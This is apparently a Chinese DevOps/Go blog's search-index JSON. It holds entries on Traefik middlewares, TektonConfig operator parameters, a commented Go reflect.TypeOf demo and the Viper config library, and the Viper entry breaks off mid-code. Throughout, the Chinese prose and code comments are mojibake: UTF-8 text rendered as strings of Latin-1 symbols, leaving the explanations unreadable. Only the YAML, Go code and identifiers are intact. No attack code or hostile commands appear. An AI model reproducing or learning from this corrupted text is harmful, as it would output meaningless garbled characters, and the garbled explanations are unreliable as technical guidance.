https://doc.traefik.io/traefik/middlewares/http/overview/#available-http-middlewares AddPrefix æ·»åŠ è¯·æ±‚å‰ç¼€ BasicAuth æ·»åŠ  Basic Authentication è®¤è¯ Buffering è®¾ç½®è¯·æ±‚å’Œå“åº”çš„buffer Chain ç»„åˆå¤šä¸ªä¸­é—´ä»¶ä½œä¸ºä¸€ä¸ªä¸­é—´ä»¶ CircuitBreaker é¿å…å‘å·²ç»æ— æ³•æ­£å¸¸å·¥ä½œçš„æœåŠ¡å‘é€è¯·æ±‚ï¼Œä»è€Œå‡å°‘å¯¹å…¶é€ æˆçš„è´Ÿè½½å’Œå½±å“ã€‚å¦‚æœæ£€æµ‹åˆ°åç«¯æœåŠ¡å·²ç»æ¢å¤æ­£å¸¸ï¼Œåˆ™æ–­è·¯å™¨å°†å…³é—­ï¼Œä»è€Œé‡æ–°å…è®¸è¯·æ±‚é€šè¿‡ã€‚ Retry å‘ç”Ÿè¯·æ±‚é”™è¯¯æ—¶é‡è¯• â€¦ ","date":"2023-04-10 23:12","objectID":"/post/traefik-middleware%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%89/:1:0","tags":["traefik"],"title":"Traefik Middlewareé…ç½®è¯¦è§£(ä¸‰)","uri":"/post/traefik-middleware%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%89/"},{"categories":["kubernetes"],"content":"TCP(kind: MiddlewareTCP) https://doc.traefik.io/traefik/middlewares/tcp/overview/ InFlightConn é™åˆ¶åŒæ—¶è¿æ¥çš„æ•°é‡ IPWhiteList é™åˆ¶å…è®¸çš„å®¢æˆ·ç«¯IP ","date":"2023-04-10 23:12","objectID":"/post/traefik-middleware%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%89/:2:0","tags":["traefik"],"title":"Traefik Middlewareé…ç½®è¯¦è§£(ä¸‰)","uri":"/post/traefik-middleware%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%89/"},{"categories":["devops"],"content":"åœ¨ä½¿ç”¨ tekton-operator çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡ TektonConfig CR æ¥å®‰è£…tektonç»„ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€äº›å®‰è£…å‚æ•°,è¿‡ä¸€éç•™ä¸ªå°è±¡ æ‰€æœ‰å‚æ•° https://tekton.dev/docs/pipelines/additional-configs/ ","date":"2023-03-16 13:46","objectID":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/:0:0","tags":[""],"title":"Tekton Operatoré…ç½®å‚æ•°è¯¦è§£","uri":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"},{"categories":["devops"],"content":"å®˜æ–¹æ¨¡æ¿ apiVersion: operator.tekton.dev/v1alpha1 kind: TektonConfig metadata: name: config spec: targetNamespace: tekton-pipelines # tektonå®‰è£…åœ¨å“ªä¸ªnamespace profile: all # å®‰è£…å“ªäº›ç»„ä»¶ config: # podè°ƒåº¦ç›¸å…³ nodeSelector: \u003c\u003e tolerations: [] pipeline: # å•ç‹¬ä»‹ç» disable-affinity-assistant: false disable-creds-init: false disable-home-env-overwrite: true disable-working-directory-overwrite: true enable-api-fields: stable enable-custom-tasks: false enable-tekton-oci-bundles: false metrics.pipelinerun.duration-type: histogram metrics.pipelinerun.level: pipelinerun metrics.taskrun.duration-type: histogram metrics.taskrun.level: taskrun require-git-ssh-secret-known-hosts: false running-in-environment-with-injected-sidecars: true pruner: # è‡ªåŠ¨æ¸…ç†æ„å»ºè®°å½•èµ„æºç­‰ resources: # ç›®å‰æ”¯æŒæ¸…ç†taskrunã€pipelinerun - taskrun - pipelinerun keep: 3 # ä¿ç•™ä¸ªæ•° schedule: \"* * */1 * *\" # å®šæ—¶æ¸…ç† dashboard: # trueä¸ºå¼€å¯åªè¯»çš„dashboard readonly: false ","date":"2023-03-16 13:46","objectID":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/:1:0","tags":[""],"title":"Tekton Operatoré…ç½®å‚æ•°è¯¦è§£","uri":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"},{"categories":["devops"],"content":"pipelineå‚æ•° TektonPipeline CRä¹Ÿå¯ä»¥ç”¨æ¥å®‰è£…Tekton Pipelineç»„ä»¶ï¼Œä½†æ˜¯å®˜æ–¹å»ºè®®çš„æ˜¯ä½¿ç”¨TektonConfigæ¥å®‰è£…ã€‚ ","date":"2023-03-16 13:46","objectID":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/:1:1","tags":[""],"title":"Tekton Operatoré…ç½®å‚æ•°è¯¦è§£","uri":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"},{"categories":["devops"],"content":"å¿…é€‰å‚æ•°(å«é»˜è®¤å€¼) disable-affinity-assistant(é»˜è®¤false) è®¾ç½®ä¸º true å°†é˜»æ­¢ Tekton ä¸ºå…±äº«äº† workspace çš„æ¯ä¸ª TaskRun åˆ›å»ºAffinity Assistant Podã€‚ è¿™æ ·å°±å¯ä»¥ä¿è¯è¿™äº›podè¿è¡Œåœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œé¿å…äº†è·¨èŠ‚ç‚¹è®¿é—®pvcçš„é—®é¢˜ã€‚ disable-home-env-overwrite(é»˜è®¤true) è®¾ç½®ä¸º false Tekton å°†è¦†ç›– task å®¹å™¨ä¸­ $HOME ç¯å¢ƒå˜é‡ä¸º /tekton/homeã€‚ ps: è€ç‰ˆæœ¬åº”è¯¥æ˜¯é»˜è®¤è¦†ç›–çš„,åº”è¯¥æ˜¯0.24.0ç‰ˆæœ¬å¼€å§‹å˜äº† disable-working-directory-overwrite(é»˜è®¤true) è®¾ç½®ä¸º false Tekton å°†è¦†ç›– task å®¹å™¨çš„å·¥ä½œç›®å½•(workingDir)ã€‚ disable-creds-init(é»˜è®¤false) ä½¿ç”¨serviceAccountå¯ä»¥é…ç½®å¤šä¸ªå‡­è¯ï¼Œæ¯”å¦‚dockerã€gitã€ssh, å¦‚æœtaskä½¿ç”¨äº†è¿™ä¸ªserviceAccount, é»˜è®¤ä¼šåœ¨æ‰€æœ‰å®¹å™¨ä¸­å°†è¿™äº›å‡­è¯è½¬æ¢æˆçœŸæ­£çš„ç›®æ ‡é…ç½®æ–‡ä»¶ï¼Œå¦‚æœdisable-creds-init=true, åˆ™ä¸ä¼šå°†serviceAccountä¸­çš„å‡­è¯ä¿¡æ¯è½¬æ¢ä¸ºé…ç½®æ–‡ä»¶ã€‚ æ³¨æ„ï¼šå°†æ­¤è®¾ç½®ä¸º true å°†é˜»æ­¢ PipelineResources å·¥ä½œ, PipelineResourcesæˆ‘ä¸ªäººè§‰å¾—ä¸éœ€è¦ä½¿ç”¨å®ƒ running-in-environment-with-injected-sidecars(é»˜è®¤true) å¦‚æœä½ çš„é›†ç¾¤ä¸­æ²¡æœ‰ä½¿ç”¨è‡ªåŠ¨æ³¨å…¥ç›¸å…³çš„å‡†å…¥æ§åˆ¶å™¨,æ¯”å¦‚istioã€daprã€‚åº”å°†æ­¤é€‰é¡¹è®¾ç½®ä¸ºfalseã€‚è¿™å°†ä¼šå‡å°‘TaskRunçš„å¯åŠ¨æ—¶é—´ã€‚ å¯¹äºä½¿ç”¨æ³¨å…¥sidecarsçš„é›†ç¾¤ï¼Œè¯·è®¾ç½®ä¸º true , å¦åˆ™å¯èƒ½ä¼šå¯¼è‡´æ„å¤–è¡Œä¸ºã€‚ require-git-ssh-secret-known-hosts(é»˜è®¤false) è®¾ç½®ä¸º true å°†è¦æ±‚æä¾›ç»™Tektonçš„ä»»ä½•Git SSH Secretå¿…é¡»åŒ…å« known_hostså­—æ®µã€‚ https://www.soulchild.cn/post/2638/#%E4%B8%8D%E5%90%8C%E5%AF%86%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5 enable-tekton-oci-bundles(é»˜è®¤false) å¯ä»¥ä½¿ç”¨ Tekton Bundle å¼•ç”¨åœ¨é›†ç¾¤å¤–éƒ¨å®šä¹‰çš„taskæˆ–è€…pipelineé•œåƒã€‚ https://tekton.dev/docs/pipelines/taskruns/#tekton-bundles enable-custom-tasks(é»˜è®¤false) è®¾ç½®ä¸º true å¯ä»¥åœ¨pipelineä¸­ä½¿ç”¨custom tasksã€‚è¿™æ˜¯ä¸€ä¸ªå¤„äº alpha çš„åŠŸèƒ½ã€‚ å…³äºè‡ªå®šä¹‰ä»»åŠ¡, å¦‚æœä½ çš„ä»»åŠ¡ä¸æƒ³ä»¥podçš„å½¢å¼è¿è¡Œï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰task https://tekton.dev/docs/pipelines/runs/ https://tekton.dev/docs/pipelines/customruns/#customruns https://tekton.dev/docs/pipelines/pipelines/#using-custom-tasks enable-api-fields(é»˜è®¤stable) å†³å®šå¯ç”¨å“ªäº›ç‰¹æ€§ stable or alpha scope-when-expressions-to-task(é»˜è®¤false) é™åˆ¶whenæ¡ä»¶è¯­å¥çš„ä½œç”¨èŒƒå›´ï¼Œæ¯”å¦‚A task ä¾èµ– B task , B task è¢«whenè·³è¿‡äº†, å¦‚æœè®¾ç½®ä¸ºtrue, A task ä¼šæ‰§è¡Œ, è®¾ç½®ä¸ºfalse A task ä¸ä¼šæ‰§è¡Œ ","date":"2023-03-16 13:46","objectID":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/:1:2","tags":[""],"title":"Tekton Operatoré…ç½®å‚æ•°è¯¦è§£","uri":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"},{"categories":["devops"],"content":"metricsé…ç½® https://tekton.dev/docs/pipelines/metrics/#configuring-metrics-using-config-observability-configmap metrics.pipelinerun.duration-type(é»˜è®¤histogram) pipelineè¿è¡ŒæŒç»­æ—¶é—´çš„æŒ‡æ ‡ç±»å‹ã€‚gauge æˆ– histogram metrics.pipelinerun.level(é»˜è®¤pipeline) pipelinerun: æ¯ä¸ªpipelinerunéƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ç«‹çš„åº¦é‡æŒ‡æ ‡ã€‚ pipeline: æ‰€æœ‰ä½¿ç”¨åŒä¸€ä¸ªpipelineæ¨¡æ¿çš„pipelinerunä¼šå…±äº«ä¸€ä¸ªåº¦é‡æŒ‡æ ‡ã€‚ namespace: æ‰€æœ‰åœ¨åŒä¸€ä¸ªnamespaceä¸‹çš„pipelinerunä¼šå…±äº«ä¸€ä¸ªåº¦é‡æŒ‡æ ‡ã€‚ metrics.taskrun.duration-type(é»˜è®¤histogram) taskrunè¿è¡ŒæŒç»­æ—¶é—´çš„æŒ‡æ ‡ç±»å‹ã€‚gauge æˆ– histogram metrics.taskrun.level(é»˜è®¤task) taskrun: æ¯ä¸ªtaskrunéƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ç«‹çš„åº¦é‡æŒ‡æ ‡ã€‚ task: æ‰€æœ‰ä½¿ç”¨åŒä¸€ä¸ªtaskçš„taskrunä¼šå…±äº«ä¸€ä¸ªåº¦é‡æŒ‡æ ‡ã€‚ namespace: æ‰€æœ‰åœ¨åŒä¸€ä¸ªnamespaceä¸‹çš„taskrunä¼šå…±äº«ä¸€ä¸ªåº¦é‡æŒ‡æ ‡ã€‚ ","date":"2023-03-16 13:46","objectID":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/:1:3","tags":[""],"title":"Tekton Operatoré…ç½®å‚æ•°è¯¦è§£","uri":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"},{"categories":["devops"],"content":"å¯é€‰é…ç½® default-timeout-minutes(é»˜è®¤60) taskrunã€pipelinerunçš„è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤60åˆ†é’Ÿ default-service-account(é»˜è®¤default) TaskRunå’ŒPipelineRunä½¿ç”¨çš„é»˜è®¤ serviceAccount åç§°(å¦‚æœæ²¡æœ‰æŒ‡å®š)ã€‚ default-managed-by-label-value(é»˜è®¤tekton-pipelines) taskRunåˆ›å»ºçš„Podçš„ app.kubernetes.io/managed-by æ ‡ç­¾çš„å€¼ default-pod-template Pod æ¨¡æ¿å®šä¹‰äº†ä¸€éƒ¨åˆ† PodSpec çš„é…ç½®ï¼Œé»˜è®¤é™„åŠ åˆ°è¿è¡Œçš„podä¸­ï¼Œæ¯”å¦‚ default-pod-template: | securityContext: runAsNonRoot: true default-cloud-events-sink å°†taskRunã€pipelineRunã€Runçš„äº‹ä»¶é€šè¿‡httpå‘é€åˆ°è¿œç«¯æœåŠ¡ã€‚ äº‹ä»¶å†…å®¹ https://tekton.dev/docs/pipelines/events/#events-via-cloudevents é…ç½®ç¤ºä¾‹ https://tekton.dev/docs/pipelines/additional-configs/#configuring-cloudevents-notifications default-task-run-workspace-binding å¦‚æœTaskå£°æ˜äº†workspaceï¼Œä½†TaskRunæ²¡æœ‰æ˜ç¡®æä¾›çš„workspaceã€‚å½“TaskRunæ‰§è¡Œæ—¶ï¼Œä¼šä½¿ç”¨é»˜è®¤çš„é…ç½®æ¥ç»‘å®šworkspaceã€‚ default-task-run-workspace-binding: | persistentVolumeClaim: claimName: source-pvc default-task-run-workspace-binding: | volumeClaimTemplate: spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi ","date":"2023-03-16 13:46","objectID":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/:1:4","tags":[""],"title":"Tekton Operatoré…ç½®å‚æ•°è¯¦è§£","uri":"/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"},{"categories":["golang"],"content":" package main import ( \"fmt\" \"reflect\" ) type User struct { Name string Age int `json:\"age\"` mark string Address struct { City string } } func (u *User) SayHello() { fmt.Printf(\"ä½ å¥½%s\", u.Name) } // æœªå¯¼å‡ºçš„æ–¹æ³• func (u *User) godBye() { fmt.Printf(\"å†è§%s\", u.Name) } func main() { zs := User{Name: \"å¼ ä¸‰\", Age: 11, mark: \"æµ‹è¯•ç§æœ‰å±æ€§\", Address: struct{ City string }{City: \"Beijing\"}} // é€šè¿‡zså®ä½“ï¼Œè¿”å›ä¸€ä¸ªTypeç±»å‹, æ‹¿åˆ°çš„æ˜¯zså®ä½“çš„ç±»å‹ä¿¡æ¯,é€šè¿‡ç±»å‹ä¿¡æ¯å¯ä»¥æ‹¿åˆ°å±æ€§,ä½†æ˜¯æ‹¿ä¸åˆ°å€¼ // ä¹Ÿå°±æ˜¯è¯´å¯ä»¥çŸ¥é“zså®ä½“çš„ç±»å‹ï¼Œä»–æ˜¯ç»“æ„ä½“ï¼Œå°±å¯ä»¥è·å–ç»“æ„ä½“æœ‰å“ªäº›å±æ€§æ–¹æ³•ï¼Œå¦‚æœæ˜¯å‡½æ•°å°±å¯ä»¥çŸ¥é“å‡½æ•°çš„åå­—å…¥å‚å‡ºå‚ä¸ªæ•°ç­‰ä¿¡æ¯ã€‚ t := reflect.TypeOf(\u0026zs) // Kind è¿”å›è¯¥å®ä½“çš„æ•°æ®ç±»å‹,æ¯”å¦‚ptrã€int32ã€int64ã€stringã€arrayã€mapã€slice... fmt.Println(\"t.Kind:\\t\", t.Kind()) // ptr // Elem è¿”å›ä¸€ä¸ªå¤åˆç±»å‹çš„å…ƒç´ ç±»å‹,æ¯”å¦‚ map[string]int çš„å…ƒç´ ç±»å‹æ˜¯ int, åˆ‡ç‰‡ []string{} çš„å…ƒç´ ç±»å‹æ˜¯stringã€‚æ³¨æ„è¿”å›çš„å…ƒç´ ç±»å‹æ˜¯Type,ä»–å¯ä»¥ç»§ç»­è°ƒç”¨Typeçš„æ–¹æ³• // å¦‚æœä¸æ˜¯ Ptrã€Arrayã€Chanã€Mapã€æˆ– Slice, å°±ä¼španic fmt.Println(\"t.Elem:\\t\", t.Elem()) // å› ä¸ºæ˜¯æŒ‡é’ˆç±»å‹, æ‰€ä»¥å¯ä»¥ç”¨Elem(), è¿”å›main.User // fmt.Println(reflect.TypeOf(User{}).Elem()) // ä¸æ”¯æŒç»“æ„ä½“ç±»å‹, æ‰€ä»¥ç›´æ¥panic // Name è¿”å›è¯¥å®ä½“çš„ç±»å‹å å­—ç¬¦ä¸²ã€‚åªæœ‰ç»“æ„ä½“ã€æ•°ç»„ã€åˆ‡ç‰‡ã€mapç­‰å¤åˆç±»å‹æ‰å…·æœ‰åç§°ï¼ŒåŸºæœ¬ç±»å‹å’ŒæŒ‡é’ˆç±»å‹ç­‰ç®€å•ç±»å‹æ²¡æœ‰åç§°ã€‚ fmt.Println(\"t.Name:\\t\", t.Name()) // \"\" fmt.Println(\"t.Elem.Name:\\t\", t.Elem().Name()) // \"User\" fmt.Println(\"t.Name:\\t\", reflect.TypeOf(User{}).Name()) // \"User\" // String è¿”å›ç±»å‹çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚ fmt.Println(\"t.String:\\t\", t.String()) // *main.User // NumMethod å¦‚æœæ˜¯interfaceç±»å‹ä¼šè¿”å›å¯¼å‡º+æœªå¯¼å‡ºçš„æ–¹æ³•æ•°é‡, éinterfaceç±»å‹åªä¼šè¿”å›å¯¼å‡ºæ–¹æ³•çš„æ•°é‡ã€‚(æ–¹æ³•åå¤§å†™å¼€å¤´æ˜¯å¯¼å‡º, å°å†™æ˜¯æœªå¯¼å‡º.) fmt.Println(\"t.NumMethod:\\t\", t.NumMethod()) // 1 // MethodByName æ ¹æ®æ–¹æ³•åæŸ¥æ‰¾æ–¹æ³•, è¿”å›ä¸¤ä¸ªå€¼ // 1.æ‰¾åˆ°çš„æ–¹æ³•æ˜¯Methodç±»å‹ // Methodç±»å‹åŒ…å«äº†æ–¹æ³•çš„ç±»å‹å’Œå‡½æ•°ä¿¡æ¯ã€‚æ³¨æ„,å¦‚æœä½ çš„å®ä½“æ˜¯æ¥å£ç±»å‹ï¼Œé‚£ä¹ˆMethod.Funæ˜¯nil // 2.æ— æ³•æ‰¾åˆ°æœªå¯¼å‡ºçš„æ–¹æ³•, æ²¡æœ‰æ‰¾åˆ°ç¬¬äºŒä¸ªè¿”å›å€¼ä¸ºfalse m, exist := t.MethodByName(\"SayHello\") if exist { fmt.Println(\"t.MethodByName:\\t\", m) // {SayHello func(*main.User) \u003cfunc(*main.User) Value\u003e 0} } else { fmt.Println(\"t.MethodByName:\\t\", \"æœªæ‰¾åˆ°\") } // Method è¿”å›æ‰€æœ‰æ–¹æ³•ä¸­ç¬¬iä¸ªæ–¹æ³•(Methodç±»å‹), ä¸è¦è¶…å‡ºæ–¹æ³•æ€»æ•°,å¦åˆ™panic fmt.Println(\"t.Method:\\t\", t.Method(0)) // {SayHello func(*main.User) \u003cfunc(*main.User) Value\u003e 0} // Size è¿”å›å­˜å‚¨ç»™å®šç±»å‹çš„å€¼æ‰€éœ€çš„å­—èŠ‚æ•° å®ƒç±»ä¼¼äº unsafe.Sizeofã€‚ fmt.Println(\"t.Size:\\t\", t.Size()) // 8 // int8 1å­—èŠ‚ int32 4å­—èŠ‚, ptr 8å­—èŠ‚ type Example struct { a [1000]int32 // 1000*4å­—èŠ‚=4000 b int32 // 4å­—èŠ‚ c string // 16å­—èŠ‚, stringå­˜äº†ä¸¤ä¸ªæŒ‡é’ˆ,ä¸€ä¸ªæŒ‡å‘å†…å­˜åœ°å€,å¦ä¸€ä¸ªæŒ‡å‘stringçš„é•¿åº¦ } fmt.Println(\"t.Size:\\t\", reflect.TypeOf(Example{}).Size()) // 4024, å¤šå‡ºæ¥çš„4å­—èŠ‚æ˜¯å†…å­˜å¯¹é½å’Œå¡«å……å¯¼è‡´çš„ // Implements è¯¥ç±»å‹æ˜¯å¦å®ç°æ¥å£ç±»å‹ u, è¿™é‡Œçš„uæ˜¯Typeç±»å‹ type Person interface { SayHello() } pv := reflect.TypeOf((*Person)(nil)).Elem() // ä½¿ç”¨(*Person)(nil)æ¥è·å–æ¥å£çš„ç±»å‹ // User structæ˜¯å¦å®ç°äº†Personæ¥å£, æ³¨æ„å¦‚æœUserä¸­çš„æ–¹æ³•æ˜¯å¸¦äº†æŒ‡é’ˆæ¥æ”¶å™¨çš„, vå¿…é¡»æ˜¯æŒ‡é’ˆç±»å‹çš„User, ä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨t.Elem().Implementsä¼šå¾—åˆ°false fmt.Println(\"t.Implements:\\t\", t.Implements(pv)) // true // ä¸‹é¢è¿™ä¸¤ä¸ªä½¿ç”¨æ–¹æ³•ç±»ä¼¼Implements // AssignableTo è¯¥ç±»å‹çš„å€¼æ˜¯å¦å¯åˆ†é…ç»™ç±»å‹ u // ConvertibleTo è¯¥ç±»å‹çš„å€¼æ˜¯å¦å¯è½¬æ¢ä¸ºç±»å‹ uã€‚å³ä½¿ ConvertibleTo è¿”å› trueï¼Œè½¬æ¢ä»ç„¶å¯èƒ½ä¼š panicã€‚ä¾‹å¦‚ï¼Œåˆ‡ç‰‡ []int{} å¯è½¬æ¢ä¸º *[3]intï¼Œå‰ææ˜¯åˆ‡ç‰‡çš„é•¿åº¦å¤§äºç­‰äºæ•°ç»„çš„é•¿åº¦(å¤šå‡ºçš„éƒ¨åˆ†ä¸¢å¼ƒ)ï¼Œå¦åˆ™è½¬æ¢å°†ä¼š panicã€‚ // Comparable æ²¡æœ‰å‚æ•°, ç”¨äºæŸ¥çœ‹å½“å‰ç±»å‹æ˜¯å¦å¯ä»¥ç”¨äºæ¯”è¾ƒæ“ä½œ // è¿”å›é€šé“çš„æ–¹å‘ var c \u003c-chan int fmt.Println(\"ChanDir:\\t\", reflect.TypeOf(c).ChanDir()) // \u003c-chan // IsVariadic å‡½æ•°ç±»å‹çš„æœ€åçš„å…¥å‚æ•°æ˜¯å¦ä¸º\"...\"å‚æ•°ã€‚å¦‚æœæ˜¯ t.In(t.NumIn() - 1) è¿”å›å‚æ•°å®é™…ç±»å‹æ˜¯åˆ‡ç‰‡ã€‚ç±»å‹ä¸æ˜¯funä¼španic // è¿”å›ç»“æ„ä½“ç±»å‹çš„å­—æ®µæ•°é‡ã€‚å¦‚æœt.Kindä¸æ˜¯Struct, å°±ä¼španicã€‚ fmt.Println(\"t.NumField:\\t\", t.Elem().NumField()) // 3 // Field è¿”å›ç»“æ„ç±»å‹çš„ç¬¬ i ä¸ªå­—æ®µã€‚å¦‚æœt.Kindä¸æ˜¯Struct, å°±ä¼španicã€‚è¿”å›çš„æ•°æ®ç±»å‹æ˜¯StructField,ä»–åŒ…æ‹¬å­—æ®µçš„ç±»å‹ã€Tagã€åç§»é‡ã€æ˜¯å¦ä¸ºåµŒå¥—å­—æ®µç­‰ä¿¡æ¯ fmt.Println(\"t.Field.IsExported:\\t\", t.Elem().Field(2).IsExported()) // åˆ¤æ–­ç´¢å¼•ä¸º2çš„å­—æ®µæ˜¯å¦ä¸ºå¯¼å‡ºå­—æ®µ fmt.Println(\"t.Field.PkgPath:\\t\", t.Elem().Field(2).PkgPath) // f.PkgPath ä¸ºç©ºä»£è¡¨æ˜¯å¯¼å‡ºçš„å­—æ®µï¼Œéç©ºä»£è¡¨æ˜¯æœªå¯¼å‡ºçš„å­—æ®µ fmt.Println(\"t.Field:\\t\", t.Elem().Field(3).Type.Field(0).Name) // City è·å–åµŒå¥—å­—æ®µçš„å±æ€§å // FieldByIndex è¿”å›ç´¢å¼•å¯¹åº”çš„åµŒå¥—å­—æ®µã€‚ç›¸å½“äºå¯¹æ¯ä¸ªç´¢å¼•iä¾æ¬¡è°ƒç”¨Fieldã€‚å¦‚æœt.Kindä¸æ˜¯Struct, å°±ä¼španicã€‚ fmt.Println(\"t.FieldByIndex:\\t\", t.Elem().FieldByIndex([]int{3, 0})) // City è·å–åµŒå¥—å­—æ®µçš„å±æ€§, åˆ‡ç‰‡çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ç¬¬ä¸€å±‚å±æ€§çš„ç´¢å¼•, ç¬¬äºŒä¸ªå€¼æ˜¯åµŒå¥—å­—æ®µçš„ç´¢å¼•, ç¬¬ä¸‰ä¸ª... // FieldByName æ ¹æ®å±æ€§åæŸ¥æ‰¾å±æ€§, è¿”å›ä¸¤ä¸ªå€¼ // 1.æ‰¾åˆ°çš„å±æ€§æ˜¯StructFieldç±»å‹, ä¸Šé¢è·å–Fieldçš„æ–¹æ³•ä¹Ÿéƒ½æ˜¯è·å¾—çš„è¿™ä¸ªç±»å‹ // StructFieldç±»å‹åŒ…æ‹¬å­—æ®µçš„ç±»å‹ã€Tagã€åç§»é‡ã€ç­‰å±æ€§, PkgPathã€ç­‰ç­‰, è¿˜æä¾›äº†åˆ¤æ–­æ˜¯å¦ä¸ºå¯¼å‡ºå­—æ®µçš„æ–¹æ³• // 2.æ— æ³•æ‰¾åˆ°æœªå¯¼å‡ºçš„å­—æ®µ, æ²¡æœ‰æ‰¾åˆ°ç¬¬äºŒä¸ªè¿”å›å€¼ä¸ºfalse f, exist := t.Elem().FieldByName(\"Name\") if exist { fmt.Println(\"t.Elem().FieldByName:\\t\", f) } else { fmt.Println(\"t.Elem().FieldByName:\\t\", \"æœªæ‰¾åˆ°\") } // Key è¿”å›mapç±»å‹çš„keyæ˜¯ä»€ä¹ˆç±»å‹, å¦‚æœt.Kindä¸æ˜¯map, å°±ä¼španicã€‚ // Key() Type // Len è¿”å›æ•°ç»„ç±»å‹çš„å¤§å°(é•¿åº¦), å¦‚æœt.Kindä¸æ˜¯ar","date":"2023-03-09 20:21","objectID":"/post/go%E5%8F%8D%E5%B0%84%E4%B9%8Btypeof/:0:0","tags":["reflect"],"title":"Goåå°„ä¹‹TypeOf","uri":"/post/go%E5%8F%8D%E5%B0%84%E4%B9%8Btypeof/"},{"categories":["golang"],"content":"ä¸€ã€ç®€ä»‹ viperæ”¯æŒåŠŸèƒ½ è®¾ç½®é»˜è®¤å€¼ ä» JSON, TOML, YAML, HCL, envfile, Java propertiesä¸­è¯»å–é…ç½® å®æ—¶ç›‘å¬å’Œè‡ªåŠ¨é‡è½½é…ç½®æ–‡ä»¶ï¼ˆå¯é€‰åŠŸèƒ½ï¼‰ ä»ç¯å¢ƒå˜é‡è¯»å–é…ç½® ä»è¿œç¨‹é…ç½®ç³»ç»Ÿï¼ˆetcd æˆ– Consulï¼‰è¯»å–ï¼Œå¹¶ç›‘å¬å’Œè‡ªåŠ¨é‡è½½ ä»å‘½ä»¤è¡Œflagè¯»å– ä»ç¼“å†²åŒºè¯»å– ä»£ç ä¸­æ‰‹åŠ¨Seté…ç½® å‚æ•°åˆ«åç³»ç»Ÿ æ”¯æŒæŸ¥æ‰¾å¤šä¸ªè·¯å¾„ä¸ºé…ç½®æ–‡ä»¶ç›®å½• æ³¨æ„: viperä¸­çš„é…ç½®é¡¹ä¸åŒºåˆ†å¤§å°å†™ ä¼˜å…ˆçº§ è·å–å‚æ•°çš„ä¼˜å…ˆçº§ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œä»é«˜åˆ°ä½ Set() å‡½æ•°è®¾ç½®çš„å‚æ•°ï¼Œä¼˜å…ˆçº§æœ€é«˜ flag å‘½ä»¤è¡Œçš„å‚æ•° env ç¯å¢ƒå˜é‡çš„å‚æ•° config é…ç½®æ–‡ä»¶çš„å‚æ•° key/value store è¿œç¨‹é…ç½® default é»˜è®¤å€¼ ","date":"2023-03-04 18:56","objectID":"/post/viper%E9%85%8D%E7%BD%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/:0:1","tags":[""],"title":"Viperé…ç½®åº“çš„ä½¿ç”¨","uri":"/post/viper%E9%85%8D%E7%BD%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"categories":["golang"],"content":"äºŒã€å®‰è£… go get github.com/spf13/viper ","date":"2023-03-04 18:56","objectID":"/post/viper%E9%85%8D%E7%BD%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/:0:2","tags":[""],"title":"Viperé…ç½®åº“çš„ä½¿ç”¨","uri":"/post/viper%E9%85%8D%E7%BD%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"categories":["golang"],"content":"ä¸‰ã€å¸¸è§ç”¨æ³• 1. è®¾ç½®é»˜è®¤å€¼ viper.SetDefault(\"ContentDir\", \"content\") viper.SetDefault(\"LayoutDir\", \"layouts\") viper.SetDefault(\"Taxonomies\", map[string]string{\"tag\": \"tags\", \"category\": \"categories\"}) 2. ä»æ–‡ä»¶è¯»å– viper.SetConfigFile(\"app.yaml\") // é…ç½®æ–‡ä»¶è·¯å¾„,æ— æ‰©å±•åçš„é…ç½®æ–‡ä»¶ç”¨è¿™ä¸ªè¯»æ¯”è¾ƒå¥½ viper.SetConfigName(\"config\") // é…ç½®æ–‡ä»¶çš„åç§°, ä¸è¦å¸¦æ‰©å±•å viper.SetConfigType(\"yaml\") // å¦‚æœæ–‡ä»¶åç§°ä¸­æ²¡æœ‰æ‰©å±•åï¼Œåˆ™éœ€è¦æŒ‡å®šé…ç½®æ–‡ä»¶çš„æ ¼å¼ viper.AddConfigPath(\"/etc/appname/\") // 